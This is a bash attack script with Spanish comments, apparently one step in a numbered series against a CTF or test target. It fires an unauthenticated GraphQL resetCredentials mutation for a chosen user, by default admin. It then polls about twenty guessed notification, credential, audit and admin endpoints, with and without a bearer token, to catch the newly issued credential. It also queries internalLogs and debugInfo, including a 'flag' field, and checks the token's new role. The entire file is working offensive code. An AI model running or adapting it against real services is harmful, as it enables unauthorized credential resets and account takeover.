#!/usr/bin/env bash
# Después de un resetCredentials, polea endpoints sospechosos para capturar la nueva credencial
# Uso: ./10_post_reset.sh <userId>
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

TARGET="${1:-admin}"
echo "[*] Disparando resetCredentials para userId=${TARGET}"

RESET_RESP=$(curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"mutation { resetCredentials(userId: \\\"${TARGET}\\\") }\"}")
echo "    Respuesta: ${RESET_RESP}"
echo

# Endpoints donde puede aparecer la nueva credencial
ENDPOINTS=(
  /api/v2/notifications
  /api/v2/notifications/inbox
  /api/v2/notifications/latest
  /api/v2/credentials
  /api/v2/credentials/pending
  /api/v2/credentials/temp
  /api/v2/credentials/recent
  /api/v2/audit
  /api/v2/audit-log
  /api/v2/audit/recent
  /api/v2/events
  /api/v2/events/recent
  /api/v2/messages
  /api/v2/inbox
  /api/v2/outbox
  /api/v2/mailbox
  /api/v2/admin/resets
  /api/v2/admin/recent-resets
  /api/v2/admin/credentials
  "/api/v2/users/${TARGET}"
  "/api/v2/users/${TARGET}/credentials"
)

echo "[*] Polling endpoints post-reset..."
for ep in "${ENDPOINTS[@]}"; do
  for AUTH in "" "Authorization: Bearer ${RECON_TOKEN}"; do
    code=$(curl -s -o /tmp/_body -w '%{http_code}' "${API_URL}${ep}" ${AUTH:+-H "${AUTH}"})
    if [[ "${code}" != "404" && "${code}" != "000" ]]; then
      label=""
      [[ -n "${AUTH}" ]] && label="(+token)"
      echo "[GET ${code}] ${ep} ${label}"
      head -c 600 /tmp/_body
      echo
      echo "---"
    fi
  done
done

echo
echo "[*] internalLogs después del reset (puede haber cambiado):"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -d '{"query":"{ internalLogs }"}' | jq

echo
echo "[*] debugInfo (a veces filtra last_action / pending_credential):"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { buildVersion environment flag recon_token internalEndpoints } }"}' | jq

echo
echo "[*] Probando me con el recon_token DESPUÉS del reset (a veces el reset bindea el token):"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${RECON_TOKEN}" \
  -d '{"query":"{ me { id email role permissions } }"}' | jq
